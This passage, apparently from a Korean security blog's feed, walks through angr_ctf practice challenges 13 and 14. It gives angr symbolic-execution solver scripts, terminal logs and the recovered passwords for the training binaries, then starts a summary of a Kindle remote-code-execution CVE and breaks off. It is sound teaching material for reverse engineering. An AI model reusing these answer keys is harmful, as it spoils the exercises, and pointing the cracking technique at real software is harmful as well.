class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;strcmp&apos;</span>]())  project.hook_symbol(<span class="hljs-string">&apos;puts&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;puts&apos;</span>]())  project.hook_symbol(<span class="hljs-string">&apos;__libc_start_main&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;glibc&apos;</span>][<span class="hljs-string">&apos;__libc_start_main&apos;</span>]())  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol13.py <span class="hljs-number">13</span>_angr_static_binary WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">390</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8049446</span> (__libc_csu_init+<span class="hljs-number">0x6</span> <span class="hljs-keyword">in</span> <span class="hljs-number">13</span>_angr_static_binary (<span class="hljs-number">0x8049446</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">05</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span>,<span class="hljs-number">391</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804944e</span> (__libc_csu_init+<span class="hljs-number">0xe</span> <span class="hljs-keyword">in</span> <span class="hljs-number">13</span>_angr_static_binary (<span class="hljs-number">0x804944e</span>))<span class="hljs-string">b&apos;PNMXNMUD&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">13</span>_angr_static_binary Enter the password: PNMXNMUDGood Job.</code></pre><h1 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h1><p><img src="/2021/08/25/j0ker/angr_part5/7.png" alt="Untitled"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xBB54;&#xAC00; &#xBC1B;&#xC740; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xBB58; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC5C6;&#xB124;&#xC694;. <code>validate</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xB2E4;&#xB978; &#xACF3;&#xC5D0;&#xC11C; import&#xB97C; &#xD574;&#xC624;&#xB294; &#xD568;&#xC218;&#xC778;&#xB370;, &#xC5B4;&#xB514;&#xC5D0;&#xC11C; import&#xB97C; &#xD574;&#xC624;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/8.png" alt="Untitled"></p><p>&#xADF8;&#xB7FC; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBD10;&#xC57C;&#xC8E0;. &#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC774; &#xBB38;&#xC81C;&#xB294; <code>lib14_angr_shared_library.so</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xB124;. &#xBB38;&#xC81C; &#xC774;&#xB984;&#xC774; <code>shared_library</code>&#xC778; &#xB9CC;&#xD07C; &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBB38;&#xC81C; &#xC785;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC2E4;&#xD589;&#xC744; &#xD574;&#xBD10;&#xC57C;&#xD558;&#xB294;&#xB370;, &#xC77C;&#xB2E8; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=<span class="hljs-variable">$LD_LIBRARY_PATH</span>:/home/j0ker/angr_ctf/dist</code></pre><p>&#xC798; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; <code>validate</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/9.png" alt="Untitled"></p><p>&#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xBE44;&#xC2B7;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; angr&#xB85C; &#xC774; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xC8E0;.</p><pre><code class="hljs python">base = <span class="hljs-number">0x0</span>project = angr.Project(path_to_binary, load_options={   <span class="hljs-string">&apos;main_opts&apos;</span> : {     <span class="hljs-string">&apos;custom_base_addr&apos;</span> : base   } })</code></pre><p>&#xBA3C;&#xC800; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xD3C9;&#xC18C;&#xC640;&#xB294; &#xB2E4;&#xB974;&#xAC8C; <code>load_options</code> &#xC778;&#xC790;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xAC70;&#xB294; &#xB85C;&#xB4DC;&#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xBCA0;&#xC774;&#xC2A4; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xB294; &#xC635;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xBD84;&#xC11D;&#xD560; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; &#xBCA0;&#xC774;&#xC2A4; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB294; 0&#xC774;&#xB2C8; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, <span class="hljs-number">64</span>)validate_function_address = <span class="hljs-number">0x6D7</span>length = claripy.BVV(<span class="hljs-number">8</span>, <span class="hljs-number">32</span>)initial_state = project.factory.call_state(validate_function_address, password, length)</code></pre><p><code>validate</code> &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBCF4;&#xBA74; &#xC6B0;&#xB9AC;&#xC758; &#xC778;&#xD48B;&#xC740; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C;, &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C;&#xB294; &#xAE38;&#xC774;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xD558;&#xB098; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xD560; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;, &#xAE38;&#xC774;&#xB97C; <code>call_state</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; angr&#xC5D0;&#xC11C;&#xB294; &#xC9C0;&#xC815;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD6C4;&#xD0B9;&#xC744; &#xC4F0;&#xB294; &#xAC83;&#xACFC; &#xC548;&#xC4F0;&#xB294; &#xAC83; &#xB450; &#xAC00;&#xC9C0; &#xD480;&#xC774;&#xAC00; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB610; &#xB458; &#xB2E4; &#xD574;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? &#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xD6C4;&#xD0B9;&#xC744; &#xC4F0;&#xC9C0; &#xC54A;&#xACE0; &#xD480;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xC0DD;&#xAC01;&#xD588;&#xB358;&#xAC70;&#xB294; 8&#xBC88; &#xBB38;&#xC81C;&#xC640; &#xAC19;&#xC774; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xCC3E;&#xC558;&#xC744; &#xB54C; &#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xAC00; &#xB05D;&#xB098;&#xBA74; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; <code>strcmp(s1, s2) == 0</code>&#xC758; &#xACB0;&#xACFC;&#xBB3C;&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294;&#xB370;, &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xAC19;&#xC73C;&#xBA74; 1&#xC774;&#xACE0; &#xD2C0;&#xB9AC;&#xBA74; 0&#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xBC18;&#xD658;&#xAC12;&#xC774; 0&#xC774; &#xC544;&#xB2C8;&#xB3C4;&#xB85D; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> simulation.found:  solution_state = simulation.found[<span class="hljs-number">0</span>]  solution_state.add_constraints(solution_state.regs.eax != <span class="hljs-number">0</span>)  solution = solution_state.se.eval(password, cast_to=bytes)  print(solution)<span class="hljs-keyword">else</span>:  <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)</code></pre><p>&#xD6C4;&#xD0B9;&#xC744; &#xC548; &#xC4F0;&#xACE0; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC774;&#xAC8C; &#xB05D;!</p><p>&#xC774;&#xC81C; &#xD6C4;&#xD0B9;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC77C;&#xB2E8; &#xC5B4;&#xB514;&#xC5D0; &#xD6C4;&#xD0B9;&#xC744; &#xAC78;&#xAE4C;&#xC694;? &#xC77C;&#xB2E8; &#xBC18;&#xD658;&#xAC12;&#xC774; <code>eax</code>&#xC5D0; &#xC138;&#xD305;&#xC774; &#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB2C8;&#xAE4C; <code>ret</code>&#xC744; &#xD558;&#xAE30; &#xBC14;&#xB85C; &#xC804; &#xC8FC;&#xC18C;&#xC778; <code>0x782</code>&#xC5D0; &#xD6C4;&#xD0B9;&#xC744; &#xAC78;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python"><span class="hljs-meta">@project.hook(0x782, length=1)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_constraints</span>(<span class="hljs-params">state</span>):</span>  state.add_constraints(state.regs.eax != <span class="hljs-number">0</span>)</code></pre><p>&#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xC640; &#xAC19;&#xC774; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB85C; &#xD6C4;&#xD0B9;&#xC744; &#xAC78;&#xC5B4;&#xC8FC;&#xACE0; &#xBC11;&#xC5D0; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC704;&#xC5D0;&#xC640; &#xAC19;&#xC774; &#xC81C;&#xC57D;&#xC870;&#xAC74;&#xB9CC; &#xAC78;&#xC5B4;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC774; &#xBB38;&#xC81C;&#xB3C4; &#xB05D;!</p><h2 id="sol14-py"><a href="#sol14-py" class="headerlink" title="sol14.py"></a>sol14.py</h2><h3 id="without-hook"><a href="#without-hook" class="headerlink" title="without hook"></a>without hook</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  base = <span class="hljs-number">0x0</span>  project = angr.Project(path_to_binary, load_options={     <span class="hljs-string">&apos;main_opts&apos;</span> : {       <span class="hljs-string">&apos;custom_base_addr&apos;</span> : base     }   })  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, <span class="hljs-number">64</span>)  validate_function_address = <span class="hljs-number">0x6D7</span>  length = claripy.BVV(<span class="hljs-number">8</span>, <span class="hljs-number">32</span>)  initial_state = project.factory.call_state(validate_function_address, password, length)  simulation = project.factory.simgr(initial_state)  success_address = <span class="hljs-number">0x783</span>  simulation.explore(find=success_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution_state.add_constraints(solution_state.regs.eax != <span class="hljs-number">0</span>)      solution = solution_state.se.eval(password, cast_to=bytes)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><h3 id="with-hook"><a href="#with-hook" class="headerlink" title="with hook"></a>with hook</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  base = <span class="hljs-number">0x0</span>  project = angr.Project(path_to_binary, load_options={     <span class="hljs-string">&apos;main_opts&apos;</span> : {       <span class="hljs-string">&apos;custom_base_addr&apos;</span> : base     }   })  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, <span class="hljs-number">64</span>)  validate_function_address = <span class="hljs-number">0x6D7</span>  length = claripy.BVV(<span class="hljs-number">8</span>, <span class="hljs-number">32</span>)  initial_state = project.factory.call_state(validate_function_address, password, length)<span class="hljs-meta">  @project.hook(0x782, length=1)</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_constraints</span>(<span class="hljs-params">state</span>):</span>    state.add_constraints(state.regs.eax != <span class="hljs-number">0</span>)  simulation = project.factory.simgr(initial_state)  success_address = <span class="hljs-number">0x783</span>  simulation.explore(find=success_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.se.eval(password, cast_to=bytes)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol14.py lib14_angr_shared_library.so CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">679</span> | cle.backends | Deprecation warning: the custom_base_addr parameter has been renamed to base_addrWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">956</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x6d7</span> (validate+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> lib14_angr_shared_library.so (<span class="hljs-number">0x6d7</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">957</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register esi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x6da</span> (validate+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> lib14_angr_shared_library.so (<span class="hljs-number">0x6da</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">41</span>,<span class="hljs-number">958</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x6db</span> (validate+<span class="hljs-number">0x4</span> <span class="hljs-keyword">in</span> lib14_angr_shared_library.so (<span class="hljs-number">0x6db</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">43</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7fff0000</span> <span class="hljs-keyword">with</span> <span class="hljs-number">121</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-18</span> <span class="hljs-number">13</span>:<span class="hljs-number">01</span>:<span class="hljs-number">43</span>,<span class="hljs-number">333</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;PGXSNWTS&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">14</span>_angr_shared_library Enter the password: PGXSNWTSGood Job.</code></pre><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC774;&#xC81C; 5&#xD3B8;&#xC774; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. angr_ctf&#xB3C4; &#xAC70;&#xC758; &#xB9C9;&#xBC14;&#xC9C0;&#xB124;&#xC694;. &#xC774;&#xC81C; &#xB0A8;&#xC740; &#xBD80;&#xBD84;&#xC740; &#xC775;&#xC2A4;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC774;&#xAC70;&#xB9CC; &#xB05D;&#xB098;&#xBA74; &#xC815;&#xB9D0; CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. veritesting&#xC774;&#xB098; &#xD6C4;&#xD0B9;&#xB3C4; &#xB354; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC70;&#xB294; &#xD2C8;&#xD2C8;&#xD788; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD0DC;&#xD48D;&#xC774; &#xC62C;&#xB77C;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB9AC;&#xACE0; &#xC800;&#xB294; &#xC9C0;&#xAE08; &#xC0AC;&#xBB34;&#xC2E4;&#xC5D0; &#xAC07;&#xD600;&#xC788;&#xAD6C;&#xC694;..(&#xAE00; &#xC791;&#xC131; &#xC2DC;&#xC810;) &#xD558;&#xD558; &#xC9D1; &#xC5B4;&#xCF00; &#xAC00;&#xC9C0;&#x2026;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/25/j0ker/angr_part5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30354/30355: 아마존 e-book Kindle의 원격코드실행/권한상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/08/24/l0ch/2021-08-24/</link>
      <guid>https://hackyboiz.github.io/2021/08/24/l0ch/2021-08-24/</guid>
      <pubDate>Tue, 24 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://research.checkpoint.com/2021/i-can-take-over-your</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/i-can-take-over-your-kindle/">Do you like to read? I can take over your Kindle with an e-book</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Amazon Kindle</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Amazon e-book &#xD50C;&#xB7AB;&#xD3FC;&#xC778; &#xD0A8;&#xB4E4;(Kindle)&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(CVE-2021-30354) &#xBC0F; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;(CVE-2021-30355)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-30354"><a href="#CVE-2021-30354" class="headerlink" title="CVE-2021-30354"></a>CVE-2021-30354</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; pdfreader &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>libfpdfemb.so</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. image header &#xC601;&#xC5ED;&#xC744; 